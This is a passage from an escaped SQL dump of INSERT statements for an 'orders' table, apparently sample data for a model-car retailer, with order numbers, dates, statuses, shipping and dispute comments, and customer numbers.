VALUES (\u0026#39;10226\u0026#39;, \u0026#39;2014-02-26\u0026#39;, \u0026#39;2014-03-06\u0026#39;, \u0026#39;2014-03-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;239\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10227\u0026#39;, \u0026#39;2014-03-02\u0026#39;, \u0026#39;2014-03-12\u0026#39;, \u0026#39;2014-03-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;146\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10228\u0026#39;, \u0026#39;2014-03-10\u0026#39;, \u0026#39;2014-03-18\u0026#39;, \u0026#39;2014-03-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;173\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10229\u0026#39;, \u0026#39;2014-03-11\u0026#39;, \u0026#39;2014-03-20\u0026#39;, \u0026#39;2014-03-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10230\u0026#39;, \u0026#39;2014-03-15\u0026#39;, \u0026#39;2014-03-24\u0026#39;, \u0026#39;2014-03-20\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer very concerned about the exact color of the models. There is high risk that he may dispute the order because there is a slight color mismatch\u0026#39;, \u0026#39;128\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10231\u0026#39;, \u0026#39;2014-03-19\u0026#39;, \u0026#39;2014-03-26\u0026#39;, \u0026#39;2014-03-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;344\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10232\u0026#39;, \u0026#39;2014-03-20\u0026#39;, \u0026#39;2014-03-30\u0026#39;, \u0026#39;2014-03-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;240\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10233\u0026#39;, \u0026#39;2014-03-29\u0026#39;, \u0026#39;2014-04-04\u0026#39;, \u0026#39;2014-04-02\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested special shippment. The instructions were passed along to the warehouse\u0026#39;, \u0026#39;328\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10234\u0026#39;, \u0026#39;2014-03-30\u0026#39;, \u0026#39;2014-04-05\u0026#39;, \u0026#39;2014-04-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;412\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10235\u0026#39;, \u0026#39;2014-04-02\u0026#39;, \u0026#39;2014-04-12\u0026#39;, \u0026#39;2014-04-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;260\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10236\u0026#39;, \u0026#39;2014-04-03\u0026#39;, \u0026#39;2014-04-11\u0026#39;, \u0026#39;2014-04-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;486\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10237\u0026#39;, \u0026#39;2014-04-05\u0026#39;, \u0026#39;2014-04-12\u0026#39;, \u0026#39;2014-04-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;181\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10238\u0026#39;, \u0026#39;2014-04-09\u0026#39;, \u0026#39;2014-04-16\u0026#39;, \u0026#39;2014-04-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;145\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10239\u0026#39;, \u0026#39;2014-04-12\u0026#39;, \u0026#39;2014-04-21\u0026#39;, \u0026#39;2014-04-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;311\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10240\u0026#39;, \u0026#39;2014-04-13\u0026#39;, \u0026#39;2014-04-20\u0026#39;, \u0026#39;2014-04-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;177\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10241\u0026#39;, \u0026#39;2014-04-13\u0026#39;, \u0026#39;2014-04-20\u0026#39;, \u0026#39;2014-04-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;209\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10242\u0026#39;, \u0026#39;2014-04-20\u0026#39;, \u0026#39;2014-04-28\u0026#39;, \u0026#39;2014-04-25\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer is interested in buying more Ferrari models\u0026#39;, \u0026#39;456\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10243\u0026#39;, \u0026#39;2014-04-26\u0026#39;, \u0026#39;2014-05-03\u0026#39;, \u0026#39;2014-04-28\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;495\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;2014-04-29\u0026#39;, \u0026#39;2014-05-09\u0026#39;, \u0026#39;2014-05-04\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;2014-05-04\u0026#39;, \u0026#39;2014-05-12\u0026#39;, \u0026#39;2014-05-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;455\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;2014-05-05\u0026#39;, \u0026#39;2014-05-13\u0026#39;, \u0026#39;2014-05-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;2014-05-05\u0026#39;, \u0026#39;2014-05-11\u0026#39;, \u0026#39;2014-05-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;334\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;2014-05-07\u0026#39;, \u0026#39;2014-05-14\u0026#39;, null, \u0026#39;Cancelled\u0026#39;, \u0026#39;Order was mistakenly placed. The warehouse noticed the lack of documentation.\u0026#39;, \u0026#39;131\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;2014-05-08\u0026#39;, \u0026#39;2014-05-17\u0026#39;, \u0026#39;2014-05-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we deliver the new Ford Mustang models by end-of-quarter?\u0026#39;, \u0026#39;173\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;2014-05-11\u0026#39;, \u0026#39;2014-05-19\u0026#39;, \u0026#39;2014-05-15\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;450\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;2014-05-18\u0026#39;, \u0026#39;2014-05-24\u0026#39;, \u0026#39;2014-05-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;328\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;2014-05-26\u0026#39;, \u0026#39;2014-06-04\u0026#39;, \u0026#39;2014-05-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;406\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;2014-06-01\u0026#39;, \u0026#39;2014-06-09\u0026#39;, \u0026#39;2014-06-02\u0026#39;, \u0026#39;Cancelled\u0026#39;, \u0026#39;Customer disputed the order and we agreed to cancel it. We must be more cautions with this customer going forward, since they are very hard to please. We must cover the shipping fees.\u0026#39;, \u0026#39;201\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;2014-06-03\u0026#39;, \u0026#39;2014-06-13\u0026#39;, \u0026#39;2014-06-04\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;323\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10255\u0026#39;, \u0026#39;2014-06-04\u0026#39;, \u0026#39;2014-06-12\u0026#39;, \u0026#39;2014-06-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;209\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10256\u0026#39;, \u0026#39;2014-06-08\u0026#39;, \u0026#39;2014-06-16\u0026#39;, \u0026#39;2014-06-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;145\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;2014-06-14\u0026#39;, \u0026#39;2014-06-24\u0026#39;, \u0026#39;2014-06-15\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;450\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;2014-06-15\u0026#39;, \u0026#39;2014-06-25\u0026#39;, \u0026#39;2014-06-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;398\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;2014-06-15\u0026#39;, \u0026#39;2014-06-22\u0026#39;, \u0026#39;2014-06-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;166\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;2014-06-16\u0026#39;, \u0026#39;2014-06-22\u0026#39;, null, \u0026#39;Cancelled\u0026#39;, \u0026#39;Customer heard complaints from their customers and called to cancel this order. Will notify the Sales Manager.\u0026#39;, \u0026#39;357\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;2014-06-17\u0026#39;, \u0026#39;2014-06-25\u0026#39;, \u0026#39;2014-06-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;233\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;2014-06-24\u0026#39;, \u0026#39;2014-07-01\u0026#39;, null, \u0026#39;Cancelled\u0026#39;, \u0026#39;This customer found a better offer from one of our competitors. Will call back to renegotiate.\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;2014-06-28\u0026#39;, \u0026#39;2014-07-04\u0026#39;, \u0026#39;2014-07-02\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;175\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;2014-06-30\u0026#39;, \u0026#39;2014-07-06\u0026#39;, \u0026#39;2014-07-01\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer will send a truck to our local warehouse on 7/1/2004\u0026#39;, \u0026#39;362\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10265\u0026#39;, \u0026#39;2014-07-02\u0026#39;, \u0026#39;2014-07-09\u0026#39;, \u0026#39;2014-07-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;471\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;2014-07-06\u0026#39;, \u0026#39;2014-07-14\u0026#39;, \u0026#39;2014-07-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;386\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;2014-07-07\u0026#39;, \u0026#39;2014-07-17\u0026#39;, \u0026#39;2014-07-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;151\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;2014-07-12\u0026#39;, \u0026#39;2014-07-18\u0026#39;, \u0026#39;2014-07-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;412\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10269\u0026#39;, \u0026#39;2014-07-16\u0026#39;, \u0026#39;2014-07-22\u0026#39;, \u0026#39;2014-07-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;382\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;2014-07-19\u0026#39;, \u0026#39;2014-07-27\u0026#39;, \u0026#39;2014-07-24\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we renegotiate this one?\u0026#39;, \u0026#39;282\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;2014-07-20\u0026#39;, \u0026#39;2014-07-29\u0026#39;, \u0026#39;2014-07-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;2014-07-20\u0026#39;, \u0026#39;2014-07-26\u0026#39;, \u0026#39;2014-07-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;157\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;2014-07-21\u0026#39;, \u0026#39;2014-07-28\u0026#39;, \u0026#39;2014-07-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;314\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;2014-07-21\u0026#39;, \u0026#39;2014-07-29\u0026#39;, \u0026#39;2014-07-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;379\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;2014-07-23\u0026#39;, \u0026#39;2014-08-02\u0026#39;, \u0026#39;2014-07-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;119\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10276\u0026#39;, \u0026#39;2014-08-02\u0026#39;, \u0026#39;2014-08-11\u0026#39;, \u0026#39;2014-08-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;204\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10277\u0026#39;, \u0026#39;2014-08-04\u0026#39;, \u0026#39;2014-08-12\u0026#39;, \u0026#39;2014-08-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;148\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10278\u0026#39;, \u0026#39;2014-08-06\u0026#39;, \u0026#39;2014-08-16\u0026#39;, \u0026#39;2014-08-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;112\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10279\u0026#39;, \u0026#39;2014-08-09\u0026#39;, \u0026#39;2014-08-19\u0026#39;, \u0026#39;2014-08-15\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Cautious optimism. We have happy customers here, if we can keep them well stocked. I need all the information I can get on the planned shippments of Porches\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10280\u0026#39;, \u0026#39;2014-08-17\u0026#39;, \u0026#39;2014-08-27\u0026#39;, \u0026#39;2014-08-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;249\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10281\u0026#39;, \u0026#39;2014-08-19\u0026#39;, \u0026#39;2014-08-28\u0026#39;, \u0026#39;2014-08-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;157\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10282\u0026#39;, \u0026#39;2014-08-20\u0026#39;, \u0026#39;2014-08-26\u0026#39;, \u0026#39;2014-08-22\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10283\u0026#39;, \u0026#39;2014-08-20\u0026#39;, \u0026#39;2014-08-30\u0026#39;, \u0026#39;2014-08-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;260\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10284\u0026#39;, \u0026#39;2014-08-21\u0026#39;, \u0026#39;2014-08-29\u0026#39;, \u0026#39;2014-08-26\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Custom shipping instructions sent to warehouse\u0026#39;, \u0026#39;299\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10285\u0026#39;, \u0026#39;2014-08-27\u0026#39;, \u0026#39;2014-09-04\u0026#39;, \u0026#39;2014-08-31\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;286\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10286\u0026#39;, \u0026#39;2014-08-28\u0026#39;, \u0026#39;2014-09-06\u0026#39;, \u0026#39;2014-09-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;172\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10287\u0026#39;, \u0026#39;2014-08-30\u0026#39;, \u0026#39;2014-09-06\u0026#39;, \u0026#39;2014-09-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;298\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;2014-09-01\u0026#39;, \u0026#39;2014-09-11\u0026#39;, \u0026#39;2014-09-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;166\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10289\u0026#39;, \u0026#39;2014-09-03\u0026#39;, \u0026#39;2014-09-13\u0026#39;, \u0026#39;2014-09-04\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We need to keep in close contact with their Marketing VP. He is the decision maker for all their purchases.\u0026#39;, \u0026#39;167\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10290\u0026#39;, \u0026#39;2014-09-07\u0026#39;, \u0026#39;2014-09-15\u0026#39;, \u0026#39;2014-09-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;198\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;2014-09-08\u0026#39;, \u0026#39;2014-09-17\u0026#39;, \u0026#39;2014-09-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;448\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;2014-09-08\u0026#39;, \u0026#39;2014-09-18\u0026#39;, \u0026#39;2014-09-11\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;131\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;2014-09-09\u0026#39;, \u0026#39;2014-09-18\u0026#39;, \u0026#39;2014-09-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;249\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10294\u0026#39;, \u0026#39;2014-09-10\u0026#39;, \u0026#39;2014-09-17\u0026#39;, \u0026#39;2014-09-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;204\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;2014-09-10\u0026#39;, \u0026#39;2014-09-17\u0026#39;, \u0026#39;2014-09-14\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;362\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;2014-09-15\u0026#39;, \u0026#39;2014-09-22\u0026#39;, \u0026#39;2014-09-16\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;415\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;2014-09-16\u0026#39;, \u0026#39;2014-09-22\u0026#39;, \u0026#39;2014-09-21\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We must be cautions with this customer. Their VP of Sales resigned. Company may be heading down.\u0026#39;, \u0026#39;189\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10298\u0026#39;, \u0026#39;2014-09-27\u0026#39;, \u0026#39;2014-10-05\u0026#39;, \u0026#39;2014-10-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;103\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;2014-09-30\u0026#39;, \u0026#39;2014-10-10\u0026#39;, \u0026#39;2014-10-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;186\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;2013-10-04\u0026#39;, \u0026#39;2013-10-13\u0026#39;, \u0026#39;2013-10-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;128\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;2013-10-05\u0026#39;, \u0026#39;2013-10-15\u0026#39;, \u0026#39;2013-10-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;299\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;2013-10-06\u0026#39;, \u0026#39;2013-10-16\u0026#39;, \u0026#39;2013-10-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;201\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10303\u0026#39;, \u0026#39;2014-10-06\u0026#39;, \u0026#39;2014-10-14\u0026#39;, \u0026#39;2014-10-09\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer inquired about remote controlled models and gold models.\u0026#39;, \u0026#39;484\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;2014-10-11\u0026#39;, \u0026#39;2014-10-20\u0026#39;, \u0026#39;2014-10-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;256\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;2014-10-13\u0026#39;, \u0026#39;2014-10-22\u0026#39;, \u0026#39;2014-10-15\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Check on availability.\u0026#39;, \u0026#39;286\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10306\u0026#39;, \u0026#39;2014-10-14\u0026#39;, \u0026#39;2014-10-21\u0026#39;, \u0026#39;2014-10-17\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;187\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10307\u0026#39;, \u0026#39;2014-10-14\u0026#39;, \u0026#39;2014-10-23\u0026#39;, \u0026#39;2014-10-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;339\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10308\u0026#39;, \u0026#39;2014-10-15\u0026#39;, \u0026#39;2014-10-24\u0026#39;, \u0026#39;2014-10-20\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that FedEx Ground is used for this shipping\u0026#39;, \u0026#39;319\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10309\u0026#39;, \u0026#39;2014-10-15\u0026#39;, \u0026#39;2014-10-24\u0026#39;, \u0026#39;2014-10-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;121\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10310\u0026#39;, \u0026#39;2014-10-16\u0026#39;, \u0026#39;2014-10-24\u0026#39;, \u0026#39;2014-10-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;259\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10311\u0026#39;, \u0026#39;2014-10-16\u0026#39;, \u0026#39;2014-10-23\u0026#39;, \u0026#39;2014-10-20\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Difficult to negotiate with customer. We need more marketing materials\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10312\u0026#39;, \u0026#39;2014-10-21\u0026#39;, \u0026#39;2014-10-27\u0026#39;, \u0026#39;2014-10-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10313\u0026#39;, \u0026#39;2014-10-22\u0026#39;, \u0026#39;2014-10-28\u0026#39;, \u0026#39;2014-10-25\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that FedEx Ground is used for this shipping\u0026#39;, \u0026#39;202\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10314\u0026#39;, \u0026#39;2014-10-22\u0026#39;, \u0026#39;2014-11-01\u0026#39;, \u0026#39;2014-10-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;227\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10315\u0026#39;, \u0026#39;2014-10-29\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;2014-10-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;119\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10316\u0026#39;, \u0026#39;2014-11-01\u0026#39;, \u0026#39;2014-11-09\u0026#39;, \u0026#39;2014-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that ad materials (such as posters, pamphlets) be included in the shippment\u0026#39;, \u0026#39;240\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10317\u0026#39;, \u0026#39;2014-11-02\u0026#39;, \u0026#39;2014-11-12\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;161\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10318\u0026#39;, \u0026#39;2014-11-02\u0026#39;, \u0026#39;2014-11-09\u0026#39;, \u0026#39;2014-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;157\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10319\u0026#39;, \u0026#39;2014-11-03\u0026#39;, \u0026#39;2014-11-11\u0026#39;, \u0026#39;2014-11-06\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;456\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10320\u0026#39;, \u0026#39;2014-11-03\u0026#39;, \u0026#39;2014-11-13\u0026#39;, \u0026#39;2014-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;144\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10321\u0026#39;, \u0026#39;2014-11-04\u0026#39;, \u0026#39;2014-11-12\u0026#39;, \u0026#39;2014-11-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;462\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10322\u0026#39;, \u0026#39;2014-11-04\u0026#39;, \u0026#39;2014-11-12\u0026#39;, \u0026#39;2014-11-10\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer has worked with some of our vendors in the past and is aware of their MSRP\u0026#39;, \u0026#39;363\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10323\u0026#39;, \u0026#39;2014-11-05\u0026#39;, \u0026#39;2014-11-12\u0026#39;, \u0026#39;2014-11-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;128\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10324\u0026#39;, \u0026#39;2014-11-05\u0026#39;, \u0026#39;2014-11-11\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;181\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10325\u0026#39;, \u0026#39;2014-11-05\u0026#39;, \u0026#39;2014-11-13\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;121\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10326\u0026#39;, \u0026#39;2014-11-09\u0026#39;, \u0026#39;2014-11-16\u0026#39;, \u0026#39;2014-11-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;144\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10327\u0026#39;, \u0026#39;2014-11-10\u0026#39;, \u0026#39;2014-11-19\u0026#39;, \u0026#39;2014-11-13\u0026#39;, \u0026#39;Resolved\u0026#39;, \u0026#39;Order was disputed and resolved on 12/1/04. The Sales Manager was involved. Customer claims the scales of the models don\\\u0026#39;t match what was discussed.\u0026#39;, \u0026#39;145\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10328\u0026#39;, \u0026#39;2014-11-12\u0026#39;, \u0026#39;2014-11-21\u0026#39;, \u0026#39;2014-11-18\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer very concerned about the exact color of the models. There is high risk that he may dispute the order because there is a slight color mismatch\u0026#39;, \u0026#39;278\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10329\u0026#39;, \u0026#39;2014-11-15\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;2014-11-16\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;131\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10330\u0026#39;, \u0026#39;2014-11-16\u0026#39;, \u0026#39;2014-11-25\u0026#39;, \u0026#39;2014-11-21\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;385\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10331\u0026#39;, 